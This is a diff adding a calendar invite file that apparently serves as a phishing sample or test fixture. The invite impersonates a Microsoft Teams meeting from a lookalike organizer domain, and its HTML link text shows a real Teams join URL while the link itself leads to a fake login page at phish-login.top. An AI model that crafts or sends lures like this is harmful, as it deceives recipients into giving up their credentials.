@@ -1,0 +1,22 @@
+BEGIN:VCALENDAR
+VERSION:2.0
+PRODID:-//Microsoft Corporation//Outlook 16.0 MIMEDIR//EN
+METHOD:REQUEST
+BEGIN:VEVENT
+UID:11111111-2222-3333-4444-555555555555
+DTSTAMP:20251125T021000Z
+DTSTART:20251126T120000Z
+DTEND:20251126T130000Z
+SUMMARY:Budget Planning Session
+ORGANIZER;CN="Microsoft Teams":mailto:meetings@ms-teams-invite.com
+ATTENDEE;CN="Zhang Min";RSVP=TRUE:mailto:zhang.min@example.com
+LOCATION:Microsoft Teams
+DESCRIPTION;ALTREP="cid:part1":<html><body><p>You have been invited to a Teams m
+ eeting.</p><p><a href="https://phish-login.top/teams/oauth">https://teams.micro
+ soft.com/l/meetup-join/19%3ameeting_xyz</a></p></body></html>
+X-ALT-DESC;FMTTYPE=text/html:<html><body><p>Join the meeting:</p><a href="https:
+ //phish-login.top/teams/oauth"><b>Click here to join Microsoft Teams</b></a></b
+ ody></html>
+SEQUENCE:0
+END:VEVENT
+END:VCALENDAR
